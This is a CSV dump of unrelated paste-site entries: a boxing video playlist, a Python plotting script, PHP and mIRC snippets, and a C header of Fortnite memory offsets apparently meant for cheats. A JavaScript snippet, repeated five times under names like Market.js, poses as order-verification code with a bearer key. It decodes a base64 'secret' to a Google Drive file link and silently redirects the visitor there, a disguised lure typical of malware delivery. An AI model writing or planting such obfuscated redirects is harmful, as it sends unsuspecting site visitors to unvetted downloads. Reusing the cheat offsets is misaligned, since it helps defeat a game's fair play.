id,title,username,language,date,content
aj9hRrAF,Untitled,jaguenk,JSON,Friday 28th of March 2025 06:20:30 PM CDT,"{
""name"": ""DiFeriDos ReMenBer BoXing"",
""author"": ""🅰️🅵1🅲🅸🅾️🅽🅰️🅳🅾️🆂"",
""url"": ""https://pastebin.com/raw/aj9hRrAF"",
""image"": ""https://i.gifer.com/J4L.gif"",
""telegram"": ""@Tintxi"",
""info"": ""by Tintxi"",
""stations"":
	[
 
	{
	""name"": ""Ali 🆚 Mildenberger"",
	""image"": ""https://i.postimg.cc/j2pRQFZv/IMG-20240126-131836-632.jpg"",
	""url"": ""https://filemoon.to/d/75s14ytthmny"",
	""info"": ""10-09-1966"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"":""true"",
	""online"":""true""
	},
	{ 
	""name"": ""Mosley 🆚 Cotto"", 
	""image"": ""https://i.postimg.cc/mDgnbQ3y/IMG-20240127-030005.jpg"", 
	""url"": ""https://filemoon.to/d/3da3r8oh8i7c"", 
	""info"": ""11-11-2007"", 
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"", 
	""online"": ""true"" 
	},
	{ 
	""name"": ""Hagler 🆚 Duran"",
	""image"": ""https://i.postimg.cc/hv9ZspKg/IMG-20240127-030014.jpg"",
	""url"": ""https://filemoon.to/d/qlytfygy17lk"",
	""info"": ""10-11-1983"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
	{ 
	""name"": ""Pacquiao 🆚 Bradley"",
	""image"": ""https://i.postimg.cc/rwDWbBJj/IMG-20240127-121133.jpg"",
    ""url"": ""https://filemoon.to/d/g6py37oqop4g"",
	""info"": ""09-06-2012"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Pacquiao 🆚 Bradley 2"",
	""image"": ""https://i.postimg.cc/LsNGQZ6G/IMG-20240127-121142.jpg"",
	""url"": ""https://filemoon.to/d/in6sb7et92vv"",
	""info"": ""12-04-2014"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Pacquiao 🆚 Margarito"",
	""image"": ""https://i.postimg.cc/7YGncQfr/IMG-20240127-121150.jpg"",
	""url"": ""https://filemoon.to/d/mk4yajwvp1lv"",
	""info"": ""13-11-2010"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Alvarez 🆚 Hatton"",
	""image"": ""https://i.postimg.cc/nVSqZ8Ww/IMG-20240127-121158.jpg"",
	""url"": ""https://filemoon.to/d/8en77h8vn9aw"",
	""info"": ""05-03-2011"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
    ""embed"": ""true"",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Cotto 🆚 Martinez"",
	""image"": ""https://i.postimg.cc/DzxW7LZ3/IMG-20240127-121206.jpg"",
	""url"": ""https://filemoon.to/d/n35lr0vhbu5b"",
	""info"": ""07-06-2014"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Barrera 🆚 Pacquiao"",
	""image"": ""https://i.postimg.cc/Kv7Hcr6W/IMG-20240127-121214.jpg"",
	""url"": ""https://filemoon.to/d/b6iac2nocnwa"",
	""info"": ""15-11-2003"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Canelo 🆚 Chavez Jr"",
	""image"": ""https://i.postimg.cc/7PVrL4rD/IMG-20240127-165120.jpg"",
	""url"": ""https://filemoon.to/d/wviw3xhpl11m"",
	""info"": ""06-05-2017"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Tyson 🆚 Holmes"",
	""image"": ""https://i.postimg.cc/wTCCfjhX/IMG-20240127-121837-297.jpg"",
	""url"": ""https://filemoon.to/d/09phevok6xhg"",
	""info"": ""22-01-1988"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Foreman 🆚 Ellis"",
	""image"": ""https://i.postimg.cc/7PnvskKd/IMG-20240127-121849-122.jpg"",
	""url"": ""https://filemoon.to/d/n6lravtnbzi4"",
	""info"": ""12-07-1991"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Hamed 🆚 Barrera"",
	""image"": ""https://i.postimg.cc/Fsz3jgPY/IMG-20240127-123851-351.jpg"",
	""url"": ""https://filemoon.to/d/v71jnsjkm6qj"",
	""info"": ""07-04-2001"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Maywheather 🆚 Marquez"",
	""image"": ""https://i.postimg.cc/Sx2Q4Vdb/IMG-20240127-124415-891.jpg"",
	""url"": ""https://filemoon.to/d/hv51ewok6wfm"",
	""info"": ""19-09-2009"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Buchanan 🆚 Duran"",
	""image"": ""https://i.postimg.cc/s2JgHxKM/IMG-20240127-125107-745.jpg"",
	""url"": ""https://filemoon.to/d/gukuro2j0blc"",
	""info"": ""26-06-1972"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Ali 🆚 Chuvalo"",
	""image"": ""https://i.postimg.cc/Xq8YfYYW/IMG-20240128-115740.jpg"",
	""url"": ""https://filemoon.to/d/5g6qo5hwapkx"",
	""info"": ""29-06-1966"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Chavez 🆚 Smith"",
	""image"": ""https://i.postimg.cc/fyRrCY4B/IMG-20240128-120104-508.jpg"",
	""url"": ""https://filemoon.to/d/j24cl04tcjye"",
	""info"": ""19-09-1991"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
  	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""De La Hoya 🆚 Quartey"",
	""image"": ""https://i.postimg.cc/9MjLLMNR/IMG-20240128-121706-495.jpg"",
	""url"": ""https://filemoon.to/d/mi9nhrab466h"",
	""info"": ""13-02-1999"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Marciano 🆚 Moore"",
	""image"": ""https://i.postimg.cc/SNyWQPPM/IMG-20240128-123246-989.jpg"",
	""url"": ""https://filemoon.to/d/zksplgins83r"",
	""info"": ""21-09-1955"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Torres 🆚 Cotton"",
	""image"": ""https://i.postimg.cc/d3znq5wL/IMG-20240128-123455-840.jpg"",
	""url"": ""https://filemoon.to/d/n2u5ttifcret"",
	""info"": ""15-08-1966"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Tyson 🆚 Ruddock"",
	""image"": ""https://i.postimg.cc/DfRFHJBT/Tyson-vs-ruddock.jpg"",
	""url"": ""https://filemoon.in/d/zuueuxiqs0pg"",
	""info"": ""18-03-1991"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Barkley 🆚 Duran"",
	""image"": ""https://i.postimg.cc/fb5Dn23s/IMG-20240202-081550-655.jpg"",
	""url"": ""https://filemoon.to/d/r7u7k3791v6s"",
	""info"": ""02-12-2000"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Trinidad 🆚 Vargas"",
	""image"": ""https://i.postimg.cc/nrt5vcWD/IMG-20240202-081628-116.jpg"",
	""url"": ""https://filemoon.to/d/if6vrk15nx3u"",
	""info"": ""24-02-1989"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Leonard 🆚 Camacho"",
	""image"": ""https://i.postimg.cc/RCYDJK0V/IMG-20240202-081643-035.jpg"",
	""url"": ""https://filemoon.to/d/gw3n1lza8cl8"",
	""info"": ""01-03-1997"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Holyfield 🆚 Holmes"",
	""image"": ""https://i.postimg.cc/NFFZ7k9g/IMG-20240202-081656-212.jpg"",
	""url"": ""https://filemoon.to/d/fglvnvtje276"",
	""info"": ""19-06-1992"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Holyfield 🆚 Foreman"",
	""image"": ""https://i.postimg.cc/qvRbDmyS/Holyfield-Foreman-19-04-91.jpg"",
	""url"": ""https://filemoon.to/d/yl6700qvjome"",
	""info"": ""19-04-1991"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Mosley 🆚 Mayorga"",
	""image"": ""https://i.postimg.cc/1XsMGMyW/Mosley-Mayorga-27-09-08.jpg"",
	""url"": ""https://filemoon.to/d/svu3u8tt8fr6"",
	""info"": ""27-09-2008"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Foreman 🆚 Briggs"",
	""image"": ""https://i.postimg.cc/NF0XmwZC/IMG-20240221-201216-934.jpg"",
	""url"": ""https://filemoon.to/d/09elvbu7ru02"",
	""info"": ""22-11-1997"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Whitaker 🆚 Chavez"",
	""image"": ""https://i.postimg.cc/m213DF4h/IMG-20240221-201236-722.jpg"",
	""url"": ""https://filemoon.to/d/6t51d8gkgtcj"",
	""info"": ""10-09-1993"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Morales 🆚 Pacquiao"",
	""image"": ""https://i.postimg.cc/Fzp49Cwf/IMG-20240221-201256-852.jpg"",
	""url"": ""https://filemoon.to/d/5iup2twnbd1f"",
	""info"": ""19-03-2005"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Louis 🆚 Charles"",
	""image"": ""https://i.postimg.cc/bwTGBwxG/IMG-20240311-203743-326.jpg"",
	""url"": ""https://filemoon.to/d/heji2bom3gtp"",
	""info"": ""29-09-1950"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Ali 🆚 Patterson"",
	""image"": ""https://i.postimg.cc/jSs3dbvR/IMG-20240311-203751-668.jpg"",
	""url"": ""https://filemoon.to/d/51tjgzrl4pz4"",
	""info"": ""20-09-1972"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Chavez 🆚 Taylor"",
	""image"": ""https://i.postimg.cc/7hZWbS03/IMG-20240330-201718.jpg"",
	""url"": ""https://filemoon.to/d/6esrdx0p7tn8/"",
""referer"":""https://embedme.xyz"",
	""info"": ""17-03-1990"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Hagler 🆚 Leonard"",
	""image"": ""https://i.postimg.cc/QM5RYqCy/hagler-1.jpg"",
	""url"": ""https://filemoon.to/d/gk1hwe6o5x25"",
""referer"":""https://embedme.xyz"",
	""info"": ""06-04-1987"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Vargas 🆚 Wright"",
	""image"": ""https://i.postimg.cc/yYBsnP6W/images-1.jpg"",
	""url"": ""https://filemoon.to/d/zaief02wvvco"",
""referer"":""https://embedme.xyz"",
	""info"": ""04-12-1999"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Leonard 🆚 Mayweather Sr"",
	""image"": ""https://i.postimg.cc/DZ95Cwnw/IMG-20240725-200333-1.jpg"",
	""url"": ""https://filemoon.to/d/7rx5eohor9ue"",
""referer"":""https://embedme.xyz"",
	""info"": ""09-09-1978"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Marquez 🆚 Peden"",
	""image"": ""https://i.postimg.cc/nz8xYq4z/x1080-1.jpg"",
	""url"": ""https://filemoon.to/d/6r7qachp3fzk"",
""referer"":""https://embedme.xyz"",
	""info"": ""09-03-2002"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
{ 
	""name"": ""Hagler 🆚 Mugabi"",
	""image"": ""https://i.postimg.cc/wvsGPjM7/sddefault-1.jpg"",
	""url"": ""https://nikaplayerr.com/file/aqpxa9ictmef"",
""referer"":"""",
	""info"": ""10-03-1986"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	}
 
 
]
}"
78nPJ6cP,Untitled,Oppaceted,Python,Friday 28th of March 2025 06:20:08 PM CDT,"from plots_drawing import *
from body_creation import *
import numpy as np
from constants import x_lim, y_lim

while True:
    body_generation_type = input(""Введите вариант отрисовки тела - 'full' для полной отрисовки или 'edges' чтобы нарисовать только границы: "")
    if body_generation_type in [""full"", ""edges""]:
        break
    else:
        print(""Слово написано некорректно, попробуйте ещё раз\n"")

while True:
    n = input(""\nВведите количество точек или ничего для значения по умолчанию (100 точек): "")
    try:
        n = 100 if n == """" else int(n)
        initial_points = generate_body_points_full(n=n) if body_generation_type == ""full"" else generate_body_points_only_edge(n=n)
        # Расчет траекторий
        plot_trajectories(initial_points)
    except:
        print(""Некорректный ввод, пожалуйста, повторите"")
        continue
    break

# Визуализация линий тока
t = []
t_default = [1.0, 1.4]
while True:
    temp = input(f""\nВведите моменты времени, в которые нужно отрисовать графики. Значение по умолчанию: [1.0, 1.4] Текущие значение:{t}\nВведите ваше значение, или ничего, если хотите продолжить:"")
    if temp:
        try:
            temp = float(temp)
            if temp > 0:
                t.append(temp)
            else:
                raise ValueError
        except:
            print(""Некорректный ввод, пожалуйста, повторите"")
    else:
        break
t = t_default if not t else t

print()

while True:
    quarter = input(""Введите четверть в которой хотите посчитать (в условии первая): "")
    if quarter not in [""1"", ""2"", ""3"", ""4""]:
        print(""Пожалуйста, введите четверть  как число"")
    else:
        quarter = int(quarter)
        break

x_lim_enter = np.array(tuple(reversed(x_lim)))*-1 if quarter in [2, 3] else np.array(x_lim)
y_lim_enter = np.array(tuple(reversed(y_lim)))*-1 if quarter in [3, 4] else np.array(y_lim)

for i in t:
    plot_streamlines(i, x_lim=x_lim_enter, y_lim=y_lim_enter)"
5gCjrF2f,Untitled,angelgoitia,PHP,Friday 28th of March 2025 06:12:18 PM CDT,"$response = $this->client->get($googleApiUrl, [
                'query' => [
                    'q' => ""{$hashtag} site:instagram.com"",
                    'num' => 10, 
                    'key' => env('GOOGLE_API'),
                    'cx' => env('GOOGLE_CX'),
                ],
                'headers' => [
                    'Accept' => 'application/json',
                ],
            ]);

            $results = json_decode($response->getBody()->getContents(), true);
            dd($results);"
0j6qVxm2,RSS,Tiago_f,mIRC,Friday 28th of March 2025 06:09:17 PM CDT,"on *:dialog:rss.add:*:*:{
  if ($devent == init) {
    if (%rss.edit) {
      tokenize 32 %rss.edit
      did -a $dname 4 $1
      did -a $dname 3 $2-
      dialog -t $dname Edit RSS feed $chr(35) $+ $calc($did(feedr,3).sel -1)
    }
  }
  elseif ($devent == sclick) {
    if ($did == 6) {
      if ($did(3)) && ($did(4)) {
        var %u = $replace($did(4),$chr(32),% $+ 20)
        if (%rss.edit) {
          var %editurl 1
          if (%u == $wd(%rss.edit,1,32)) %editurl = 0
          if ($hget(rss,%u) != $null) && (%editurl) { errdialog The URL you edited %u already exists with the name $wd($hget(rss,%u),2-,32) $+ ! | halt }
          else {
            var %n = $encode($did(3),m),%v = $cell(feedr,3,1)),%e = %v $+ *
            while ($hfind(rssdone,%e,1,w)) {
              var %i = $v1
              hadd rssdone $+(%n,,$wd(%i,2,1)) 1
              hdel rssdone %i
            }
            hadd rssdone SHA1: $+ %n $hget(rssdone,SHA1: $+ %v)
            hdel rssdone SHA1: $+ %v
            hdel rss %rss.edit
            hadd rss %u $calc($wd($did(feedr,3).seltext,5,32) -1) $did(3)
            did -co feedr 3 $did(feedr,3).sel 1 +fs 0 0 $wd($did(feedr,3).seltext,5,32) $did(3) $+ 	+ 0 0 0 %u
          }
        }
        elseif ($hget(rss,%u) != $null) { errdialog The URL %u already exists! | halt }
        else {
          hadd rss %u 0 $did(3)
          mdxunsel feedr 3
          did -ac feedr 3 1 + 0 0 1 $did(3) $+ 	+ 0 0 0 %u
        }
        did $iif($did(feedr,3).sel,-e,-b) feedr 6,8,24,26
        did $iif($did(feedr,3).lines >= 1,-e,-b) feedr 7
      }
      else { beep.error | halt }
    }
  }
}"
YFP331Ud,Market.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 05:59:14 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/544/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iWuGQAE3,Untitled,rodrigomaise99,JavaScript,Friday 28th of March 2025 05:43:51 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/208/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YuEG8LAt,Products.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 05:28:07 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/583/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mQxpeB15,Untitled,RayTheLocker123123,C,Friday 28th of March 2025 05:27:38 PM CDT,"#define GWORLD 0x1771c988
#define FNAME 0x1792E740                     //0x130C2A80
#define GAME_INSTANCE 0x208 //0x210 
#define LOCAL_PLAYERS 0x38
#define PLAYER_CONTROLLER 0x30 
#define LOCAL_PAWN 0x350
#define CURRENT_WEAPON 0xa80 
#define VELOCITY 0x180 //CompentVELOCITY
#define GRAVITY 0x8a2 // bUseGravity
#define PAWN_PRIVATE 0x320
#define location_under_reticle  0x27f0 // https://dumpspace.spuckwaffel.com/Games/?hash=6b77eceb&type=classes&idx=AFortPlayerController&member=LocationUnderReticle
#define ROOT_COMPONENT 0x1B0
#define RELATIVE_LOCATION 0x138
#define PLAYER_STATE 0x2c8
#define PLAYER_CAMARA_MANEGER 0x360
#define GAME_STATE 0x190 /// 0x188 //0x190
#define PLAYER_ARRAY 0x2C0
#define MESH 0x328
#define Playername 0xb08
#define TEAM_INDEX 0x1259
#define WEAPON_DATA 0x570
#define CURRENT_WEAPON 0xa80
#define AMMO_COUNT 0xefc
#define COMPONENT_TO_WORLD 0x1E0
#define CURRENT_VEHICLE 0x2b40
#define BONE_ARRAY 0x5c8
#define BONE_ARRAY_ACCHE 0x5b8
#define LAST_SUMBIT_TIME 0x2E8
#define LAST_SUMBIT_TIME_ON_SCREEN 0x2F0
#define ProjectileSpeed 0x1d48  //ProjectileSpeed  
#define ProjectileGravityScale 0x1dfc // ProjectileGravityScale
#define PLATFORM 0x430
#define HABANERO_COMPONENT 0xa48
#define RANKED_PROGRESS 0xd0
#define PLAYER_ID 0x2ac
#define b_is_dying 0x718
#define ITEM_NAME 0x40
#define TargetedFortPawn 0x1990

#define KILL_COUNT 0x126c // https://dumpspace.spuckwaffel.com/Games/?hash=6b77eceb&type=classes&idx=AFortPlayerStateAthena&member=KillScore
#define FortPTR uintptr_t"
nSA9W5yc,Order.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 05:12:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/547/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UhBbr3TK,Market.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 04:57:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/074/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
